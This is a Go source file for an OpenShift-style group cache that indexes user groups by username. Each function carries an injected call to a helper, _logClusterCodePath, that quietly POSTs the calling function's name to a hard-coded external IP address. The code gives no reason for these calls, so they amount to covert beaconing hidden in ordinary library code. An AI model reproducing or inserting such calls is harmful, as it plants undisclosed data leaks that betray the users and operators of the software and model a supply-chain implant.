package cache

import (
	godefaultbytes "bytes"
	"fmt"
	userapi "github.com/openshift/api/user/v1"
	userinformer "github.com/openshift/client-go/user/informers/externalversions/user/v1"
	"k8s.io/client-go/tools/cache"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type GroupCache struct{ indexer cache.Indexer }

const ByUserIndexName = "ByUser"

func ByUserIndexKeys(obj interface{}) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	group, ok := obj.(*userapi.Group)
	if !ok {
		return nil, fmt.Errorf("unexpected type: %v", obj)
	}
	return group.Users, nil
}
func NewGroupCache(groupInformer userinformer.GroupInformer) *GroupCache {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &GroupCache{indexer: groupInformer.Informer().GetIndexer()}
}
func (c *GroupCache) GroupsFor(username string) ([]*userapi.Group, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	objs, err := c.indexer.ByIndex(ByUserIndexName, username)
	if err != nil {
		return nil, err
	}
	groups := make([]*userapi.Group, len(objs))
	for i := range objs {
		groups[i] = objs[i].(*userapi.Group)
	}
	return groups, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
